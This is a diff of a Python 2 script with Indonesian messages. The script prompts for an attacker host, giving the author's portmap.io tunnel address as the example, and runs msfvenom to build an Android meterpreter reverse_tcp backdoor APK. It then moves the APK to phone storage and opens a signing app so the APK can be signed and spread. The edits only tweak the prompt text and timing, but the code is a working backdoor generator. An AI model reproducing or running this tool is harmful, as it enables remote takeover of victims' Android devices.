@@ -133,7 +133,7 @@ def sisip():
     	print ' '
     print "\x1b[1;97mMasukan LHOST"
     print "Contoh Menggunakan Config Saya"
-    print "tcp://\x1b[1;91mgafar97port-53967.portmap.io" 
+    print "\x1b[1;91mgafar97port-53967.portmap.io" 
     print "\x1b[1;91m                 ^"
     print "----------------------------------------------"
     lh=raw_input("lhost : ")
@@ -196,7 +196,7 @@ def baru():
     
     print "\x1b[1;97mMasukan LHOST"
     print "Contoh Menggunakan Config Saya"
-    print "tcp://\x1b[1;91mgafar97port-53967.portmap.io" 
+    print "\x1b[1;91mgafar97port-53967.portmap.io" 
     print "\x1b[1;91m                 ^"
     print "----------------------------------------------"
     lh=raw_input("lhost : ")
@@ -204,12 +204,9 @@ def baru():
     os.system('clear')
     print hijau+"[*] GENERATE BACKDOOR \n"
     os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+lh+" LPORT="+port+" -o "+name+".apk")
-    os.system("clear")
-    print '[+] BERHASIL MEMBUAT BACKDOOR' 
-    print '[+] SELANJUTNYA BUKA APLIKASI SIGNER'
-    print '[+] LALU SIGN BACKDOOR MU'
-    time.sleep(3)
+    time.sleep(4)
     os.system('mv '+str(name)+'.apk /storage/emulated/0/')
+    time.sleep(4)
     os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
     home()
   
